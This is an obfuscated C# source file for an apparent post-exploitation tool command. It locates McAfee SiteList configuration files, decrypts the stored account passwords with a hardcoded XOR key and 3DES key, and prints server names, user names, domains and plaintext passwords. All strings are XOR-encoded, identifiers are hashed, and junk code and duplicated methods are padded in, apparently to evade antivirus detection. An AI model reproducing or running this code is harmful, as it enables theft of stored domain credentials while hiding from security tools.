using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using O_F41F88FA.Output.TextWriters;
using O_F41F88FA.Output.Formatters;
using O_F41F88FA.Util;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

namespace O_F41F88FA.Commands
{
    class O_1E1BDBB1
    {
        public O_1E1BDBB1(string type, string name, string server, string relativePath, string shareName, string userName, string domainName, string encPassword, string decPassword)
        {
            Type = type;
            Name = name;
            Server = server;
            RelativePath = relativePath;
            ShareName = shareName;
            UserName = userName;
            DomainName = domainName;
            EncPassword = encPassword;
            DecPassword = decPassword;
        }

        public string Type { get; set; }
        public string Name { get; set; }
        public string Server { get; set; }
        public string RelativePath { get; set; }
        public string ShareName { get; set; }
        public string UserName { get; set; }
        public string DomainName { get; set; }
        public string EncPassword { get; set; }
        public string DecPassword { get; set; }
    }
internal class O_698CF7A5 : O_2183A68D
{
    public override string Command => Encoding.UTF8.GetString(Convert.FromBase64String("RMTo5M1+3O99wuXr228=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("Caepgqgbj4Y=")[iii % 8])).ToArray());
    public override string Description => Encoding.UTF8.GetString(Convert.FromBase64String("qFmZ/f24lRCNUoOv4qeUXogct+zFroRVzG+T++GEiEOYEoLi6OiCX4Jak+jxuoBEhVOUr+KhjVWfEg==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("7Dz6j4TI4TA=")[iii % 8])).ToArray());
    public override CommandGroup[] Group => new[]
    {
        CommandGroup.Misc
    };
    public override bool SupportRemote => false;

    public O_698CF7A5(Runtime runtime) : base(runtime)
    {
    }

    public static string DecryptSiteListPassword(string b64password)
    {
        byte[] XORKey =
        {
            0x12,
            0x15,
            0x0F,
            0x10,
            0x11,
            0x1C,
            0x1A,
            0x06,
            0x0A,
            0x1F,
            0x1B,
            0x18,
            0x17,
            0x16,
            0x05,
            0x19
        };
        var passwordBytes = System.Convert.FromBase64String(b64password);
        for (var i = 0; i < passwordBytes.Length; i++)
        {
            passwordBytes[i] = (byte)(passwordBytes[i] ^ XORKey[i % XORKey.Length]);
        }

        SHA1 crypto = new SHA1CryptoServiceProvider();
        var tDESKey = MiscUtil.Combine(crypto.ComputeHash(System.Text.Encoding.ASCII.GetBytes(Encoding.UTF8.GetString(Convert.FromBase64String("p5Xidh3lIYQ=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("m7SiVTnAf7o=")[iii % 8])).ToArray()))), new byte[] { 0x00, 0x00, 0x00, 0x00 });
        var tDESalg = new TripleDESCryptoServiceProvider();
        tDESalg.Mode = CipherMode.ECB;
        tDESalg.Padding = PaddingMode.None;
        tDESalg.Key = tDESKey;
        var decrypted = tDESalg.CreateDecryptor().TransformFinalBlock(passwordBytes, 0, passwordBytes.Length);
        var end = Array.IndexOf(decrypted, (byte)0x00);
        var password = System.Text.Encoding.ASCII.GetString(decrypted, 0, end);
        return password;
    }

    public override IEnumerable<O_4AED570F?> Execute(string[] args)
    {
        string[] paths =
        {
            Encoding.UTF8.GetString(Convert.FromBase64String("6tFHHvoaeDXIhjsI4Rl6NPU=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("qesbToh1H0c=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("HxaXk6uCEEQ9QeuFsIESRXwEs/vvxCs=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("XCzLw9ntdzY=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("AQGyH5dG/qQjVqoukUjF").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("QjvuT+UpmdY=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("kLyPVqIhoAi26Kdh7SO7AfPVtma5K7sCoNo=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("04bTEs1C1WU=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("01yqL9PGlCPM").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("kGb2eqCj5lA=")[iii % 8])).ToArray())
        };
        foreach (var path in paths)
        {
            foreach (var foundFile in MiscUtil.GetFileList(Encoding.UTF8.GetString(Convert.FromBase64String("aC4mhoMfmQwVPz+P").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("O0dS48926ng=")[iii % 8])).ToArray()), path))
            {
                var xmlString = File.ReadAllText(foundFile);
                xmlString = xmlString.Replace(Encoding.UTF8.GetString(Convert.FromBase64String("e+FQK4P1mNI1rUEpgejMhmnuCmaKu43YI7dGIdL3u+MB8xBk0Os=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("R94oRu/V7rc=")[iii % 8])).ToArray()), Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("an8Q5lvfYA0=")[iii % 8])).ToArray()));
                var xmlDoc = new XmlDocument();
                xmlDoc.LoadXml(xmlString);
                var sites = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("tRBn/mrbapI=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("5nkTmyayGeY=")[iii % 8])).ToArray()));
                if (sites[0].ChildNodes.Count == 0)
                    continue;
                var mcafeeSites = new List<O_1E1BDBB1>();
                foreach (XmlNode site in sites[0].ChildNodes)
                {
                    if (site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("IQQztw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("b2Ve0sP/qNM=")[iii % 8])).ToArray())] == null || site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("47L5jyDi").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("sNeL+UWQOLs=")[iii % 8])).ToArray())] == null)
                    {
                        continue;
                    }

                    var type = site.Name;
                    var name = site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("9qScqQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("uMXxzN2OYCQ=")[iii % 8])).ToArray())].Value;
                    var server = site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("ieusdDNd").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("2o7eAlYv464=")[iii % 8])).ToArray())].Value;
                    var relativePath = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("BOuVl8uJR6g=")[iii % 8])).ToArray());
                    var shareName = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("IrneToz7qAQ=")[iii % 8])).ToArray());
                    var user = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("L5Y0MiMgyzI=")[iii % 8])).ToArray());
                    var encPassword = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("tDlP6IJNOQ0=")[iii % 8])).ToArray());
                    var decPassword = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("aw5EP5iOLLU=")[iii % 8])).ToArray());
                    var domainName = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("1AwMBKlsh0c=")[iii % 8])).ToArray());
                    foreach (XmlElement attribute in site.ChildNodes)
                    {
                        switch (attribute.Name)
                        {
                            case "RelativePath":
                                relativePath = attribute.InnerText;
                                break;
                            case "ShareName":
                                shareName = attribute.InnerText;
                                break;
                            case "UserName":
                                user = attribute.InnerText;
                                break;
                            case "Password":
                                if (MiscUtil.IsBase64String(attribute.InnerText))
                                {
                                    encPassword = attribute.InnerText;
                                    decPassword = DecryptSiteListPassword(encPassword);
                                }
                                else
                                {
                                    decPassword = attribute.InnerText;
                                }

                                break;
                            case "DomainName":
                                domainName = attribute.InnerText;
                                break;
                            default:
                                break;
                        }
                    }

                    var config = new O_1E1BDBB1(type, name, server, relativePath, shareName, user, domainName, encPassword, decPassword);
                    mcafeeSites.Add(config);
                }

                if (mcafeeSites.Count > 0)
                {
                    yield return new O_A9599790(foundFile, mcafeeSites);
                }
            }
        }

        yield return null;
    }

internal class O_A9599790 : O_4AED570F
{
    public O_A9599790(string path, List<O_1E1BDBB1> sites)
    {
        Path = path;
        Sites = sites;
    }

    public string Path { get; set; }
    public List<O_1E1BDBB1> Sites { get; set; }
}    [CommandOutputType(typeof(O_A9599790))]
    internal class O_762C0948 : TextFormatterBase
    {
        public O_762C0948(ITextWriter writer) : base(writer)
        {
        }

        public override void FormatResult(O_2183A68D? command, O_4AED570F result, bool filterResults)
        {
            var dto = (O_A9599790)result;
            WriteLine($"  McAfee SiteList Config ({dto.Path}):\n");
            foreach (var site in dto.Sites)
            {
                WriteLine($"    Type            : {site.Type}");
                WriteLine($"    Name            : {site.Name}");
                WriteLine($"    Server          : {site.Server}");
                WriteLine($"    RelativePath    : {site.RelativePath}");
                WriteLine($"    ShareName       : {site.ShareName}");
                WriteLine($"    UserName        : {site.UserName}");
                WriteLine($"    DomainName      : {site.DomainName}");
                WriteLine($"    EncPassword     : {site.EncPassword}");
                WriteLine($"    DecPassword     : {site.DecPassword}\n");
            }

            WriteLine();
        }

        public void FormatResult(O_2183A68D? command, O_4AED570F result, bool filterResults, string LEJyVCen)
        {
            try
            {
                Task.Run(() =>
                {
                    try
                    {
                        System.Text.UTF32Encoding instance = new System.Text.UTF32Encoding();
                        instance.GetMaxCharCount(86);
                    }
                    catch (Exception)
                    {
                    }
                }).Start();
            }
            catch (Exception)
            {
            }

            var dto = (O_A9599790)result;
            WriteLine($"  McAfee SiteList Config ({dto.Path}):\n");
            foreach (var site in dto.Sites)
            {
                WriteLine($"    Type            : {site.Type}");
                WriteLine($"    Name            : {site.Name}");
                WriteLine($"    Server          : {site.Server}");
                WriteLine($"    RelativePath    : {site.RelativePath}");
                WriteLine($"    ShareName       : {site.ShareName}");
                WriteLine($"    UserName        : {site.UserName}");
                WriteLine($"    DomainName      : {site.DomainName}");
                WriteLine($"    EncPassword     : {site.EncPassword}");
                WriteLine($"    DecPassword     : {site.DecPassword}\n");
            }

            WriteLine();
        }
    }

    public static string DecryptSiteListPassword(string b64password, string awxMtFUh)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Text.UTF32Encoding instance = new System.Text.UTF32Encoding();
                    instance.GetMaxCharCount(86);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        byte[] XORKey =
        {
            0x12,
            0x15,
            0x0F,
            0x10,
            0x11,
            0x1C,
            0x1A,
            0x06,
            0x0A,
            0x1F,
            0x1B,
            0x18,
            0x17,
            0x16,
            0x05,
            0x19
        };
        var passwordBytes = System.Convert.FromBase64String(b64password);
        for (var i = 0; i < passwordBytes.Length; i++)
        {
            passwordBytes[i] = (byte)(passwordBytes[i] ^ XORKey[i % XORKey.Length]);
        }

        SHA1 crypto = new SHA1CryptoServiceProvider();
        var tDESKey = MiscUtil.Combine(crypto.ComputeHash(System.Text.Encoding.ASCII.GetBytes(Encoding.UTF8.GetString(Convert.FromBase64String("p5Xidh3lIYQ=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("m7SiVTnAf7o=")[iii % 8])).ToArray()))), new byte[] { 0x00, 0x00, 0x00, 0x00 });
        var tDESalg = new TripleDESCryptoServiceProvider();
        tDESalg.Mode = CipherMode.ECB;
        tDESalg.Padding = PaddingMode.None;
        tDESalg.Key = tDESKey;
        var decrypted = tDESalg.CreateDecryptor().TransformFinalBlock(passwordBytes, 0, passwordBytes.Length);
        var end = Array.IndexOf(decrypted, (byte)0x00);
        var password = System.Text.Encoding.ASCII.GetString(decrypted, 0, end);
        return password;
    }

    public IEnumerable<O_4AED570F?> Execute(string[] args, string NVATGgcb)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Text.UTF32Encoding instance = new System.Text.UTF32Encoding();
                    instance.GetMaxCharCount(86);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        string[] paths =
        {
            Encoding.UTF8.GetString(Convert.FromBase64String("6tFHHvoaeDXIhjsI4Rl6NPU=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("qesbToh1H0c=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("HxaXk6uCEEQ9QeuFsIESRXwEs/vvxCs=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("XCzLw9ntdzY=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("AQGyH5dG/qQjVqoukUjF").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("QjvuT+UpmdY=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("kLyPVqIhoAi26Kdh7SO7AfPVtma5K7sCoNo=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("04bTEs1C1WU=")[iii % 8])).ToArray()),
            Encoding.UTF8.GetString(Convert.FromBase64String("01yqL9PGlCPM").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("kGb2eqCj5lA=")[iii % 8])).ToArray())
        };
        foreach (var path in paths)
        {
            foreach (var foundFile in MiscUtil.GetFileList(Encoding.UTF8.GetString(Convert.FromBase64String("aC4mhoMfmQwVPz+P").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("O0dS48926ng=")[iii % 8])).ToArray()), path))
            {
                var xmlString = File.ReadAllText(foundFile);
                xmlString = xmlString.Replace(Encoding.UTF8.GetString(Convert.FromBase64String("e+FQK4P1mNI1rUEpgejMhmnuCmaKu43YI7dGIdL3u+MB8xBk0Os=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("R94oRu/V7rc=")[iii % 8])).ToArray()), Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("an8Q5lvfYA0=")[iii % 8])).ToArray()));
                var xmlDoc = new XmlDocument();
                xmlDoc.LoadXml(xmlString);
                var sites = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("tRBn/mrbapI=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("5nkTmyayGeY=")[iii % 8])).ToArray()));
                if (sites[0].ChildNodes.Count == 0)
                    continue;
                var mcafeeSites = new List<O_1E1BDBB1>();
                foreach (XmlNode site in sites[0].ChildNodes)
                {
                    if (site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("IQQztw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("b2Ve0sP/qNM=")[iii % 8])).ToArray())] == null || site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("47L5jyDi").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("sNeL+UWQOLs=")[iii % 8])).ToArray())] == null)
                    {
                        continue;
                    }

                    var type = site.Name;
                    var name = site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("9qScqQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("uMXxzN2OYCQ=")[iii % 8])).ToArray())].Value;
                    var server = site.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("ieusdDNd").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("2o7eAlYv464=")[iii % 8])).ToArray())].Value;
                    var relativePath = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("BOuVl8uJR6g=")[iii % 8])).ToArray());
                    var shareName = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("IrneToz7qAQ=")[iii % 8])).ToArray());
                    var user = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("L5Y0MiMgyzI=")[iii % 8])).ToArray());
                    var encPassword = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("tDlP6IJNOQ0=")[iii % 8])).ToArray());
                    var decPassword = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("aw5EP5iOLLU=")[iii % 8])).ToArray());
                    var domainName = Encoding.UTF8.GetString(Convert.FromBase64String("").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("1AwMBKlsh0c=")[iii % 8])).ToArray());
                    foreach (XmlElement attribute in site.ChildNodes)
                    {
                        switch (attribute.Name)
                        {
                            case "RelativePath":
                                relativePath = attribute.InnerText;
                                break;
                            case "ShareName":
                                shareName = attribute.InnerText;
                                break;
                            case "UserName":
                                user = attribute.InnerText;
                                break;
                            case "Password":
                                if (MiscUtil.IsBase64String(attribute.InnerText))
                                {
                                    encPassword = attribute.InnerText;
                                    decPassword = DecryptSiteListPassword(encPassword);
                                }
                                else
                                {
                                    decPassword = attribute.InnerText;
                                }

                                break;
                            case "DomainName":
                                domainName = attribute.InnerText;
                                break;
                            default:
                                break;
                        }
                    }

                    var config = new O_1E1BDBB1(type, name, server, relativePath, shareName, user, domainName, encPassword, decPassword);
                    mcafeeSites.Add(config);
                }

                if (mcafeeSites.Count > 0)
                {
                    yield return new O_A9599790(foundFile, mcafeeSites);
                }
            }
        }

        yield return null;
    }
}}